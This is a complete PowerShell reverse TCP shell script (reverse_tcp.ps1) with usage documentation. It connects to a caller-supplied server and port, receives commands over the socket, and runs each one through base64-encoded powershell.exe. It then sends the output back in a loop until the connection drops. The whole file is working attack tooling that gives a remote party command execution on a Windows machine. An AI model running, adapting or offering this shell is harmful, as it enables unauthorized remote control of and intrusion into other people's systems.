<#
.AUTHOR
0x10F8

.SYNOPSIS
Allows a device running powershell capable windows to connect to a remote server and 
interpret commands from this server as commands on the device (reverse tcp shell).

.EXAMPLE
Connect back to the reverse shell server
PS C:\> .\reverse_tcp.ps1 -s 127.0.0.1 -p 9001
If you want to debug the script the verbose option will output a lot of info during running
#>

# Read the required parameters
Param (
    [Parameter(Mandatory = $true)]    [string]    [ValidateNotNullOrEmpty()]  [Alias('s')]  $server,
    [Parameter(Mandatory = $true)]    [int]       [ValidateNotNullOrEmpty()]  [Alias('p')]  $port
)

$WAIT_MS = 500 # Time (ms) to wait between reads from the tcp socket

function Get-Connection-State([System.Net.Sockets.TcpClient] $connection) {
    <#
    .Description
    Gets the connection state for the TcpClient object given. 
    The response will be a System.Net.NetworkInformation.TCPState object
    #> 
    $connection_props = [System.Net.NetworkInformation.IPGlobalProperties]::
    GetIPGlobalProperties().GetActiveTcpConnections().Where( {
            $_.LocalEndPoint -eq $connection.Client.LocalEndPoint -and $_.RemoteEndPoint -eq $connection.Client.RemoteEndPoint
        })
    return $connection_props.State
}

function Invoke-Cmd([string] $command) {
    <#
    .Description
    Invokes the command given and returns the response as a string
    #> 
    $response = ""
    if ($command) {
        Write-Verbose "Recieved command: $command"
        try {
            # Encode the command as base64 and send to powershell
            # This seems to solve some issues around formatting and escaping
            $commandbytes = [System.Text.Encoding]::Unicode.GetBytes($command)
            $base64command = [System.Convert]::ToBase64String($commandbytes)
            $response = &powershell.exe -EncodedCommand "$base64command" 2>&1 | Out-String
        }
        catch {
            $response = $error[0]
        }
        Write-Verbose "The response: $response"
    }
    return $response
}

Write-Verbose "Connecting to server $server on port $port"

# Create the TCP connection and setup readers and writers
$connection = New-Object System.Net.Sockets.TcpClient($server, $port)
$stream = $connection.GetStream()
$reader = New-Object System.IO.StreamReader($stream)
$writer = New-Object System.IO.StreamWriter($stream)
$writer.AutoFlush = $true

# Start read/write loop
$connected = $true
while ($connected) {
    
    # Read command
    if ($stream.DataAvailable) {
        $request = $reader.ReadLine()
    }

    # Handle command
    $response = Invoke-Cmd $request

    if ($response) {
        $writer.Write($response)
    }

    # Check if the remote server disconnected
    $connection_state = Get-Connection-State $connection
    $connected = ($connection_state -eq [System.Net.NetworkInformation.TCPState]::Established)

    # Reset request/response vars
    $request = ""
    $response = ""

    # Wait a short time before the next read/write loop
    start-sleep -Milliseconds $WAIT_MS
}

# Disconnect
Write-Verbose "Disconnected from server $server"
$reader.Close()
$writer.Close()
$connection.Close()
